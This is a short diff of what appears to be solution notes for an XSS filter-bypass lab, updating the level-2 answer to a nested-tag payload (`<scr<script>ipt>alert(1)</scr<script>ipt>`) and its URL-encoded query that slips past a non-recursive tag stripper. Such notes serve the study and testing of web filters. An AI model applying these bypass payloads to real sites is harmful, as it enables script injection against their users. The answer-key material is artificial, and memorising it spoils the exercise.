@@ -11,10 +11,10 @@ Multiple stacked filters (tag blacklist, event-handler regex, protocol strip, lo
 
 ### filterchain-level2
 
-`/filterchain/level2/?query=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/script%3E`
+`/filterchain/level2/?query=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/scr%3Cscript%3Eipt%3E`
 
-- payload: `<scr<script>ipt>alert(1)</script>`
-- context: `strip_tags` is non-recursive; inner `<script>` removed leaves outer `<script>`
+- payload: `<scr<script>ipt>alert(1)</scr<script>ipt>`
+- context: `strip_tags` is non-recursive; nest both the opening and the closing tag
 
 ### filterchain-level3
 
